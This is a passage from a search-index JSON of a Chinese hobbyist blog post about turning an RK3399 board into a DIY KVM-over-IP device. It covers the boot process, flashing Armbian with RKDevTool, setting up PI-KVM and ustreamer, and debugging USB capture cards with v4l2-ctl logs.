(lightembedded.com)</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u57fa\u672c\u77e5\u8bc6","title":"\u57fa\u672c\u77e5\u8bc6","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u955c\u50cf\u6587\u4ef6","title":"\u955c\u50cf\u6587\u4ef6","text":"<ul> <li>\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u51e0\u90e8\u5206<ul> <li>bootloader\uff08\u5982 uboot\uff09</li> <li>kernel\uff08linux kernel\uff09</li> <li>rootfs\uff08ubuntu, debian \u7b49\u4e0d\u540c\u53d1\u884c\u7248\u90fd\u662f\u8be5\u90e8\u5206\u4e0d\u540c\uff09</li> </ul> </li> <li>\u5e76\u4e14\u5404\u90e8\u5206\u6240\u5904\u5730\u5740\u7a7a\u95f4\u5206\u533a\u662f SoC \u5382\u5546\u5206\u914d\u597d\u7684\u3002<ul> <li>\u5bf9\u4e8e\u5f00\u53d1\u677f\u8fd9\u79cd\u8bbe\u5907\uff0cCPU \u542f\u52a8\u65f6\u4f1a\u4ece\u7247\u4e0a\u7684\u4e00\u5c0f\u5757 boot ROM \u542f\u52a8\uff0c\u4f5c\u4e3a\u7b2c 0 \u7ea7\u5f15\u5bfc\u3002\u4e4b\u540e\u518d\u4ece eMMC, SD \u5361\u7b49\u8bbe\u5907\u52a0\u8f7d\u5f15\u5bfc\u7a0b\u5e8f\u542f\u52a8\u3002\u56e0\u6b64\u955c\u50cf\u6587\u4ef6\u5305\u542b\u4ee5\u4e0a\u5168\u90e8\u90e8\u5206\uff0c\u53ea\u9700\u8981\u5c06\u955c\u50cf\u5b8c\u6574\u5199\u5165\u5916\u90e8\u5b58\u50a8\u3002\u8ba1\u7b97\u673a\u542f\u52a8\u65f6\u4fbf\u4f1a\u4ece\u6b63\u786e\u4f4d\u7f6e\u5f00\u59cb\u5f15\u5bfc\u542f\u52a8</li> <li>\u5bf9\u4e8e\u8def\u7531\u5668\u5237 openwrt\uff0cCPU \u901a\u5e38\u4ece flash \u542f\u52a8\u3002\u56e0\u6b64\u5237\u7cfb\u7edf\u65f6\u4e00\u822c\u53ea\u4f1a\u5237 flash \u4e2d kernel + rootfs \u5206\u533a\u3002\u56e0\u4e3a\u4fdd\u7559\u539f\u5382 bootloader \u53ef\u4ee5\u4fdd\u8bc1\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u539f\u5382\u5de5\u5177\u6062\u590d\u539f\u5382\u7cfb\u7edf\u3002\u540c\u65f6 flash \u4e2d\u4e00\u4e9b\u5206\u533a\u8fd8\u5305\u542b\u7f51\u5361 MAC \u5730\u5740\u7b49\u4fe1\u606f\uff0c\u56e0\u6b64\u4e0d\u80fd\u4fee\u6539\u3002</li> </ul> </li> <li>buildroot \u9879\u76ee\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5b9a\u5236 bootloader, kernel, rootfs \u8fd9\u4e09\u90e8\u5206\uff0c\u751f\u6210\u5b9a\u5236\u5316\u7684\u7cfb\u7edf\u955c\u50cf</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#boot-rom","title":"boot ROM","text":"<ul> <li>\u5f00\u53d1\u677f\u8fd9\u79cd\u8bbe\u5907\u6709\u7247\u4e0a boot ROM \u7684\u597d\u5904\u5c31\u662f\uff0c\u4e0d\u7528\u62c5\u5fc3\u53d8\u7816\u3002</li> </ul> <p>Firefly-RK3399 \u6709\u7075\u6d3b\u7684\u542f\u52a8\u65b9\u5f0f\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u786c\u4ef6\u635f\u574f\uff0cFirefly-RK3399 \u5f00\u53d1\u677f\u662f\u4e0d\u4f1a\u53d8\u7816\u7684\u3002\u5982\u679c\u5728\u5347\u7ea7\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u610f\u5916\uff0cbootloader \u635f\u574f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u91cd\u65b0\u5347\u7ea7\uff0c\u6b64\u65f6\u4ecd\u53ef\u4ee5\u8fdb\u5165\u00a0<code>MaskRom</code>\u00a0\u6a21\u5f0f\u6765\u4fee\u590d\u3002</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5237\u5165\u4ecb\u8d28","title":"\u5237\u5165\u4ecb\u8d28","text":"<p>\u8981\u770b SoC \u652f\u6301\u76f4\u63a5\u4ece\u54ea\u4e9b\u4f4d\u7f6e\u542f\u52a8\uff0c\u4e00\u822c\u652f\u6301 SD/tf, eMMC\u3002\u4ece\u5176\u4f59\u5b58\u50a8\u4ecb\u8d28\u542f\u52a8\u53ef\u80fd\u9700\u8981\u5148\u5c06 bootloader \u5199\u5165\u677f\u8f7d\u5b58\u50a8\uff0c\u7136\u540e\u518d\u5c06\u5269\u4f59\u955c\u50cf\u5199\u5165\u5176\u5b83\u5b58\u50a8</p> <p>ROCK-5B \u5728\u4e3b\u677f\u4e0a\u6709\u4e00\u4e2a SPI \u95ea\u5b58\uff0c\u5c06\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\u5b89\u88c5\u5230 SPI \u95ea\u5b58\u53ef\u4ee5\u652f\u6301 SoC maskrom \u6a21\u5f0f\u4e0d\u76f4\u63a5\u652f\u6301\u7684\u5176\u4ed6\u542f\u52a8\u4ecb\u8d28\uff08\u5982 SATA\u3001USB3 \u6216 NVMe\uff09 https://github.com/ophub/amlogic-s9xxx-armbian/blob/main/build-armbian/documents/README.cn.md#8213-%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F%E8%87%B3-nvme</p> <p>\u5c06\u955c\u50cf\u5199\u5165 SD \u5361\u8fd9\u79cd\u5916\u90e8\u5b58\u50a8\u6bd4\u8f83\u5bb9\u6613</p> <ul> <li>Rufus - Create bootable USB drives the easy way</li> <li>balenaEtcher - Flash OS images to SD cards &amp; USB drives</li> </ul> <p>\u4f46\u662f\u8981\u5c06\u955c\u50cf\u5199\u5165\u677f\u8f7d\u7684 eMMC \u5b58\u50a8\u5219\u9700\u8981\u4e13\u95e8\u7684\u5de5\u5177</p> <ul> <li>\u4e00\u822c\u8fd9\u79cd\u677f\u8f7d\u5b58\u50a8\u90fd\u6709\u5b98\u65b9\u5f00\u53d1\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u5199\u3002\u6bd4\u5982 Rochchip \u63d0\u4f9b\u4e86 RKDevTool\uff0c\u901a\u8fc7 USB \u8fde\u63a5\u4e0a\u4f4d\u673a\u548c\u5f00\u53d1\u677f\uff0c\u5f00\u53d1\u677f\u542f\u52a8\u65f6\uff0cboot ROM \u53ef\u4ee5\u63a5\u53d7\u4ece USB \u83b7\u5f97 loader \u542f\u52a8\uff0c\u4e4b\u540e\u518d\u4ece USB \u83b7\u5f97\u6570\u636e\uff0c\u6700\u540e\u5199\u5165 eMMC</li> <li>\u4e5f\u53ef\u4ee5\u4e70\u4e00\u4e2a USB-eMMC \u7684\u8f6c\u63a5\u5668\uff08\u7f16\u7a0b\u5668\uff1f\uff09\uff0c\u76f4\u63a5\u5199</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#rkdevtool-\u4f7f\u7528","title":"RKDevTool \u4f7f\u7528","text":"<p>\u51e0\u79cd\u542f\u52a8\u6a21\u5f0f</p> <ul> <li>Normal\uff1aNormal \u6a21\u5f0f\u5c31\u662f\u6b63\u5e38\u7684\u542f\u52a8\u8fc7\u7a0b\uff0c\u5404\u4e2a\u7ec4\u4ef6\u4f9d\u6b21\u52a0\u8f7d\uff0c\u6b63\u5e38\u8fdb\u5165\u7cfb\u7edf\u3002</li> <li>Loader\uff1a\u5728 Loader \u6a21\u5f0f\u4e0b\uff0cbootloader \u4f1a\u8fdb\u5165\u5347\u7ea7\u72b6\u6001\uff0c\u7b49\u5f85\u4e3b\u673a\u547d\u4ee4\uff0c\u7528\u4e8e\u56fa\u4ef6\u5347\u7ea7\u7b49\u3002</li> <li>MaskRom\uff1aMaskRom \u6a21\u5f0f\u7528\u4e8e bootloader \u635f\u574f\u65f6\u7684\u7cfb\u7edf\u4fee\u590d\u3002<ul> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\u662f\u4e0d\u7528\u8fdb\u5165\u00a0<code>MaskRom\u00a0\u6a21\u5f0f</code>\u7684\uff0c\u53ea\u6709\u5728 bootloader \u6821\u9a8c\u5931\u8d25\uff08\u8bfb\u53d6\u4e0d\u4e86 IDB \u5757\uff0c\u6216 bootloader \u635f\u574f\uff09\u7684\u60c5\u51b5\u4e0b\uff0cBootRom \u4ee3\u7801 \u5c31\u4f1a\u8fdb\u5165\u6b64\u6a21\u5f0f\u3002\u6b64\u65f6 BootRom \u4ee3\u7801\u7b49\u5f85\u4e3b\u673a\u901a\u8fc7 USB \u63a5\u53e3\u4f20\u9001 bootloader \u4ee3\u7801\uff0c\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e4b\u3002\u5f53\u677f\u5b50\u53d8\u7816\u65e0\u6cd5\u6b63\u5e38\u542f\u52a8\u6216\u5347\u7ea7\u7a0b\u5e8f\u65f6\uff0c\u4e5f\u53ef\u4ee5\u624b\u52a8\u8fdb\u5165<code>MaskRom\u00a0\u6a21\u5f0f</code>.</li> </ul> </li> </ul> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5982\u679c eMMC \u4e0a\u6709\u597d\u7684 bootloader\uff0c\u5219\u542f\u52a8\u540e\u6309\u4f4f\u677f\u5b50\u4e0a\u7684 update \u6309\u952e\u5c31\u4f1a\u8fdb\u5165 loader \u6a21\u5f0f\uff0c\u7b49\u5f85\u4ece USB \u83b7\u5f97\u955c\u50cf\u5347\u7ea7 \u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u8fdb\u5165 Maskrom \u6a21\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u76f4\u63a5\u5199\u6574\u4e2a eMMC\u3002\u4e0d\u8fc7\u6b64\u65f6\u4e0a\u4f4d\u673a\u8981\u63d0\u4f9b\u4e24\u4e2a\u6587\u4ef6</p> <ul> <li>loader \u6587\u4ef6\uff0cboot rom \u52a0\u8f7d\u540e\u5f15\u5bfc</li> <li>\u8981\u5237\u5165 eMMC \u7684\u7cfb\u7edf\u955c\u50cf</li> </ul> <p>\u677f\u8f7d 16G eMMC\uff0c\u5199\u5e94\u8be5\u6709 40MB/s\uff0c\u6240\u4ee5\u5237\u673a\u901f\u5ea6\u8fd8\u662f\u5f88\u5feb\u7684\u3002</p> <p>\u8e29\u5751\u7ecf\u5386</p> <ul> <li>\u60f3\u76f4\u63a5\u4ece\u539f\u5382\u955c\u50cf\u5347\u7ea7\u4e3a armbian \u955c\u50cf\uff0c\u53d1\u73b0\u9009\u62e9\u955c\u50cf\u76f4\u63a5\u5c31\u62a5\u9519\u8bef\u3002<ul> <li>\u73b0\u5728\u89c9\u5f97\u662f\u4e8c\u8005 bootloader \u4e0d\u4e00\u6837\uff0c\u5bfc\u81f4\u65e0\u6cd5\u76f4\u63a5\u5347\u7ea7\u3002</li> </ul> </li> <li>\u7136\u540e\u60f3\u901a\u8fc7 maskrom \u6a21\u5f0f\uff0c\u6309\u5730\u5740 0 \u5199\u5165 armbian \u955c\u50cf\u5373\u53ef\uff0c\u7ed3\u679c\u4e0d\u884c\u3002<ul> <li>\u539f\u6765\u662f\u9700\u8981\u989d\u5916\u4e00\u4e2a loader \u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5728 armbian \u7684 github \u4ed3\u5e93\u4e2d\u6709</li> <li>\u6211\u7684 gihtub issue\u745e\u82af\u5fae\u5f00\u53d1\u5de5\u5177\u52a0\u8f7d\u56fa\u4ef6\u5931\u8d25 \u00b7 Issue #1562 \u00b7 ophub/amlogic-s9xxx-armbian (github.com)</li> </ul> </li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#rk3399-\u542f\u52a8\u8fc7\u7a0b\u63a2\u660e","title":"RK3399 \u542f\u52a8\u8fc7\u7a0b\u63a2\u660e","text":"<p>github \u4e0a\u4e00\u4e2a\u5927\u4f6c\u5199\u7684\u542f\u52a8\u8fc7\u7a0b\u8be6\u89e3\uff1aRK33XX/RK35XX\u7cfb\u5217\u8bbe\u5907\u542f\u52a8\u6d41\u7a0b\u3001\u5199\u5165\u7cfb\u7edf\u53ca\u7f16\u8bd1\u6d41\u7a0b \u00b7 ophub/amlogic-s9xxx-armbian \u00b7 Discussion #1634 (github.com)</p> <ul> <li>Rockchip \u5b98\u65b9\u6587\u6863\uff1aBoot option - Rockchip open source Document (rock-chips.com)</li> </ul> <p>ATF\uff1aARM Trusted Firmware \u5206\u6790\u2014\u2014\u542f\u52a8\u3001PSCI\u3001OP-TEE \u63a5\u53e3 - ArnoldLu - \u535a\u5ba2\u56ed (cnblogs.com))</p> <ul> <li>arm \u5904\u7406\u5668\u6709\u8fd9\u4e2a\u529f\u80fd\uff0c\u6d89\u53ca ARM \u7279\u6743\u7ea7\u5982 ELF0\uff08\u666e\u901a\u5e94\u7528\uff09, ELF1\uff08kernel\uff09,ELF2(hypervisor)</li> <li>\u4e3b\u8981\u6d89\u53ca\u5230 BL1(bootrom) -&gt; BL2(pre-loader) -&gt; BL3x -&gt; uboot -&gt; kernel</li> <li>BL1 - AP Trusted ROM\uff0c\u4e00\u822c\u4e3a BootRom\u3002</li> <li>BL2 - Trusted Boot Firmware\uff0c\u4e00\u822c\u4e3a Trusted Bootloader\u3002</li> <li>BL31 - EL3 Runtime Firmware\uff0c\u4e00\u822c\u4e3a SML\uff0c\u7ba1\u7406 SMC \u6267\u884c\u5904\u7406\u548c\u4e2d\u65ad\uff0c\u8fd0\u884c\u5728 secure monitor \u4e2d\u3002</li> <li>BL32 - Secure-EL1 Payload\uff0c\u4e00\u822c\u4e3a TEE OS Image\u3002</li> <li>BL33 - Non-Trusted Firmware\uff0c\u4e00\u822c\u4e3a uboot\u3001linux kernel\u3002</li> </ul> <p></p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#bootflow","title":"bootflow","text":"<pre><code>+--------+----------------+----------+-------------+---------+\n| Boot   | Terminology #1 | Actual   | Rockchip    | Image   |\n| stage  |                | program  |  Image      | Location|\n| number |                | name     |   Name      | (sector)|\n+--------+----------------+----------+-------------+---------+\n| 1      |  Primary       | ROM code | BootRom     |         |\n|        |  Program       |          |             |         |\n|        |  Loader        |          |             |         |\n|        |                |          |             |         |\n| 2      |  Secondary     | U-Boot   |idbloader.img| 0x40    | pre-loader\n|        |  Program       | TPL/SPL  |             |         |\n|        |  Loader (SPL)  |          |             |         |\n|        |                |          |             |         |\n| 3      |  -             | U-Boot   | u-boot.itb  | 0x4000  | including u-boot and atf\n|        |                |          | uboot.img   |         | only used with miniloader\n|        |                |          |             |         |\n|        |                | ATF/TEE  | trust.img   | 0x6000  | only used with miniloader\n|        |                |          |             |         |\n| 4      |  -             | kernel   | boot.img    | 0x8000  |\n|        |                |          |             |         |\n| 5      |  -             | rootfs   | rootfs.img  | 0x40000 |\n+--------+----------------+----------+-------------+---------+\n</code></pre> <p>Then when we talking about boot from eMMC/SD/U-Disk/net, they are in different concept:</p> <ul> <li>Stage 1 is always in boot rom, it loads stage 2 and may load stage 3(when SPL_BACK_TO_BROM option enabled).</li> <li>Boot from SPI flash means firmware for stage 2 and 3(SPL and U-Boot only) in SPI flash and stage 4/5 in other place;</li> <li>Boot from eMMC means all the firmware(including stage 2, 3, 4, 5) in eMMC;</li> <li>Boot from SD card means all the firmware(including stage 2, 3, 4, 5) in SD card;</li> <li>Boot from U-Disk means firmware for stage 4 and 5(not including SPL and U-Boot) in Disk, optionally only including stage 5;</li> <li>Boot from net/tftp means firmeware for stage 4 and 5(not including SPL and U-Boot) on the network;</li> </ul> <p>Boot Flow 1 is typical Rockchip boot flow with Rockchip miniloader; Boot Flow 2 is used for most SoCs with U-Boot TPL for ddr init and SPL for trust(ATF/OP-TEE) load and run into next stage;</p> <p></p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#armbian","title":"Armbian","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4ecb\u7ecd","title":"\u4ecb\u7ecd","text":"<p>Armbian\u662f\u517c\u5bb9 debian \u7684\u4e13\u95e8\u9488\u5bf9\u5404\u79cd arm \u5f00\u53d1\u677f\u8fdb\u884c\u4f18\u5316\u7ef4\u62a4\u7684\u53d1\u884c\u7248\u3002\u7531\u4e8e\u66f4\u65b0\u6bd4\u8f83\u5373\u65f6\uff0c\u56e0\u6b64\u751a\u81f3\u53ef\u80fd\u6bd4\u539f\u5382\u955c\u50cf\u66f4\u52a0\u7a33\u5b9a\u3002</p> <p>\u548c Raspberry Pi OS, debian/arm\u5bf9\u6bd4\uff1a</p> <ul> <li>Compared: Raspberry Pi OS vs. Armbian vs. Debian GNU/Linux (linuxhint.com)</li> <li>Armbian doc faq: what-is-the-difference-between-armbian-and-debianubuntu</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#amlogic-s9xxx-armbian-\u9879\u76ee","title":"amlogic-s9xxx-armbian \u9879\u76ee","text":"<p>Armbian \u5b98\u65b9\u5e76\u6ca1\u6709\u76f4\u63a5\u652f\u6301 king3399\uff08\u662f\u652f\u6301 Firefly \u7684\uff09</p> <p>ophub/amlogic-s9xxx-armbian: Support for Armbian in Amlogic, Rockchip and Allwinner boxes. Support a311d, s922x, s905x3, s905x2, s912, s905d, s905x, s905w, s905, s905l, rk3588, rk3568, rk3399, rk3328, h6, etc. (github.com)</p> <ul> <li>\u9002\u914d king3399 \u7684\u63d0\u4ea4\uff1aAdd support for king3399 by 13584452567 \u00b7 Pull Request #1080 \u00b7 ophub/amlogic-s9xxx-armbian (github.com)</li> </ul> <p>armbian \u5b98\u65b9\u6587\u6863\u5173\u4e8e rk3399 \u7684\u4e00\u4e9b\u6ce8\u91ca\uff0c\u6bd4\u5982\u663e\u5361\u53ea\u5728 4.4 \u5185\u6838\u4e0a\u6b63\u5e38\u5de5\u4f5cRockchip - Armbian Documentation</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<ul> <li>\u5b98\u65b9\u6587\u6863\u5f88\u5168\u4e86\uff1aArmbian Documentation</li> <li>network\uff1aHow to switch from Network Manager to systemd-networkd on Linux (xmodulo.com)</li> </ul> <p>\u8fde\u63a5 wifi \u7684\u7b80\u5355\u65b9\u6cd5</p> <pre><code>armbian-config   # \u914d\u7f6e\u6574\u4e2a\u7cfb\u7edf\uff0c\u751a\u81f3\u53ef\u4ee5\u7f16\u8f91dts\n\nnmtui\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#armbian-pi-kvm","title":"Armbian PI-KVM","text":"<ul> <li>\u6253\u9020\u666e\u901a PC \u62e5\u6709\u670d\u52a1\u5668 IPMI \u786c\u4ef6\u7ea7\u522b\u7684\u8fdc\u7a0b\u8fd0\u7ef4\u65b9\u6848 PI KVM \u786c\u4ef6\u7ea7\u8fdc\u7a0b\u63a7\u5236_\u54d4\u54e9\u54d4\u54e9_bilibili<ul> <li>\u6559\u7a0b https://github.com/toss-a/pikvm-armbian/blob/master/README-zh-CN.MD</li> </ul> </li> <li>\u4f5c\u8005\u7684\u4ed3\u5e93\uff1asrepac/kvmd-armbian: KVMD For Armbian Install Script (github.com)</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5176\u5b83_1","title":"\u5176\u5b83","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#ustreamer","title":"ustreamer","text":"<p>\u53d1\u73b0\u4e32\u6d41\u753b\u9762\u7528\u7684\u662f ustreamer\uff0cps \u770b\u5230\u7684\u5b8c\u6574\u547d\u4ee4</p> <pre><code>/usr/bin/ustreamer --device=/dev/kvmd-video --persistent --format=mjpeg --resolution=1280x720 --desired-fps=40 --drop-same-frames=30 --last-as-blank=0 --unix=/run/kvmd/ustreamer.sock --unix-rm --unix-mode=0660 --exit-on-parent-death --process-name-prefix=kvmd/streamer --notify-parent --no-log-colors --sink=kvmd::ustreamer::jpeg --sink-mode=0660 --slowdown\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#usb20-30-\u9a71\u52a8\u533a\u522b","title":"USB2.0 3.0 \u9a71\u52a8\u533a\u522b","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#linux-\u67e5\u770b-usb-\u89c6\u9891\u8bbe\u5907","title":"linux \u67e5\u770b usb \u89c6\u9891\u8bbe\u5907","text":"<pre><code>v4l2-ctl --list-devices\nv4l2-ctl --list-formats-ext\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#kvm-\u6ca1\u6709\u753b\u9762","title":"KVM \u6ca1\u6709\u753b\u9762","text":"<p>\u6700\u540e\u53d1\u73b0\u4e70\u7684 ms2130 \u5728 linux \u4e0b\uff0cusb3.0 \u65e0\u6cd5\u5de5\u4f5c\u3002\u53ea\u80fd usb \u63a5\u53e3\u63d2\u5165\u4e00\u534a\uff0c\u4f7f\u5176\u6210\u4e3a 2.0 \u65f6\uff0clinux \u4e0b\u624d\u80fd\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>\u62a5\u9519\uff0c\u8bf4\u8bbe\u5907\u4e0d\u652f\u6301\u89c6\u9891\u6355\u83b7\u3002\u4e5f\u5c31\u662f\u91c7\u96c6\u5361\u4e0d\u80fd\u7528\u3002</p> <pre><code>Jul 23 09:18:17 king3399 kvmd[382354]: kvmd.apps.kvmd.streamer           INFO --- =&gt; -- INFO  [36009.992    stream] -- Device fd=9 opened\nJul 23 09:18:17 king3399 kvmd[382354]: kvmd.apps.kvmd.streamer           INFO --- =&gt; -- ERROR [36009.992    stream] -- Video capture is not supported by device\nJul 23 09:18:17 king3399 kvmd[382354]: kvmd.apps.kvmd.streamer           INFO --- =&gt; -- INFO  [36009.992    stream] -- Device fd=9 closed\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#ms2109","title":"ms2109","text":"<pre><code>[Tue Jul 25 14:54:59 2023] usb 1-3: new high-speed USB device number 8 using xhci_hcd\n[Tue Jul 25 14:55:06 2023] usb 1-3: new high-speed USB device number 9 using xhci_hcd\n[Tue Jul 25 14:55:06 2023] usb 1-3: New USB device found, idVendor=1de1, idProduct=f105, bcdDevice= 4.09\n[Tue Jul 25 14:55:06 2023] usb 1-3: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 14:55:06 2023] usb 1-3: Product: Display capture-UVC05\n[Tue Jul 25 14:55:06 2023] usb 1-3: Manufacturer: Actions Micro\n[Tue Jul 25 14:55:06 2023] usb 1-3: SerialNumber: -1877663977\n[Tue Jul 25 14:55:06 2023] usb 1-3: Found UVC 1.00 device Display capture-UVC05 (1de1:f105)\n[Tue Jul 25 14:55:06 2023] usb 1-3: Warning! Unlikely big volume range (=7248), cval-&gt;res is probably wrong.\n[Tue Jul 25 14:55:06 2023] usb 1-3: [3] FU [Mic Capture Volume] ch = 1, val = -7264/-16/1\n\n\n\u279c  ~ v4l2-ctl --list-formats-ext\nioctl: VIDIOC_ENUM_FMT\n        Type: Video Capture\n\n        [0]: 'MJPG' (Motion-JPEG, compressed)\n                Size: Discrete 1920x1080\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1360x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1280x1024\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1280x960\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1280x720\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 1024x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 800x600\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 720x576\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 720x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n                Size: Discrete 640x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.067s (15.000 fps)\n\n\n\u279c  ~ v4l2-ctl --all\nDriver Info:\n        Driver name      : uvcvideo\n        Card type        : Display capture-UVC05: Display\n        Bus info         : usb-0000:02:00.0-3\n        Driver version   : 5.15.99\n        Capabilities     : 0x84a00001\n                Video Capture\n                Metadata Capture\n                Streaming\n                Extended Pix Format\n                Device Capabilities\n        Device Caps      : 0x04200001\n                Video Capture\n                Streaming\n                Extended Pix Format\nMedia Driver Info:\n        Driver name      : uvcvideo\n        Model            : Display capture-UVC05: Display\n        Serial           : -1877663977\n        Bus info         : usb-0000:02:00.0-3\n        Media version    : 5.15.99\n        Hardware revision: 0x00000409 (1033)\n        Driver version   : 5.15.99\nInterface Info:\n        ID               : 0x03000002\n        Type             : V4L Video\nEntity Info:\n        ID               : 0x00000001 (1)\n        Name             : Display capture-UVC05: Display\n        Function         : V4L2 I/O\n        Flags            : default\n        Pad 0x01000007   : 0: Sink\n          Link 0x0200000d: from remote pad 0x100000a of entity 'Processing 2' (Video Pixel Formatter): Data, Enabled, Immutable\nPriority: 2\nVideo input : 0 (Camera 1: 